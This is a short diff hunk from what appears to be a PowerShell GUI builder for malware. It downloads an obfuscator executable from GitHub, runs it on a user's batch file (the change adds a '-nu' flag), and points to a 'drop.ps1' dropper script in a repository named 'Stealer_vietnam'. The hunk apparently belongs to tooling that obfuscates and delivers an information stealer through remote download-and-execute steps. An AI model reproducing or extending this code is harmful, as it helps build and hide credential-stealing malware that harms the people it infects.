@@ -140,7 +140,7 @@ $button.Add_Click({
         $protectPath = ".\batchobfuscator.exe"  # Change this to the correct path
         Invoke-WebRequest -Uri "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe" -OutFile $protectPath
         # Execute the .bat file
-        Start-Process -FilePath $protectPath -ArgumentList "-f `"$filePath`"" -NoNewWindow -Wait
+        Start-Process -FilePath $protectPath -ArgumentList "-f `"$filePath`" -nu" -NoNewWindow -Wait
         # Start-Process -FilePath $compliePath -ArgumentList "`"$filePathprotect`"" -NoNewWindow -Wait
         $url = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/drop/drop.ps1"
 
